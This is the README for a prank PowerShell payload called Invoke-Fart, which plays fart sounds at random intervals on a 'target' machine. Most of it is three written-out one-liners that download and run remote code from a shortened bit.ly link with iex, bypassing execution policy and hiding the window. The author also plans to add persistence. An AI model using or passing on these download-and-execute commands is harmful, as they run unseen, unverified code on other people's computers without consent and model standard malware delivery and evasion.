# Invoke-Fart
Payload for delivering fart effects.

# Author

Unfortunately, the original author of Invoke-Fart is unkown, but suffice it to say, I stand on the shoulder's of giants. My meager contribution to the Invoke-Fart family is a randomized interval in a while loop to ensure that the payload will continue to execute at random intervals on the target.

# Configuration Options

Invoke-Fart has a couple of configuration options available.
|Argument|Type|Description|
|--------|----|-----------|
|Interval|TimeSpan|The minimum time to wait after a previous fart.|
|Jitter|TimeSpan|A range of time after the interval in which the fart will randomly play.|
|PlayImmediately|Switch|A flag that tells the payload to execute the fart immediately upon execution and then inter the loop.|

# Short PowerShell Download and Execute

The code below will download and run Invoke-Fart on an interval between 20 and 25 minutes. This will continue to un until the process is terminated by the user or though a restart.

```powershell
iex (New-Object System.Net.WebClient).DownloadString('https://bit.ly/3vc2Wju')
```

From the commandline.

```powershell
powershell.exe -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('https://bit.ly/3vc2Wju')"
```

Run as a background process from PowerShell.

```powershell
Start-Process "powershell.exe" "-ExecutionPolicy Bypass -Command `"iex (New-Object System.Net.WebClient).DownloadString('https://bit.ly/3vc2Wju')`"" -WindowStyle Hidden
```

# Future Work

In version 1.1.0, I plan on adding a persistence mechanism.
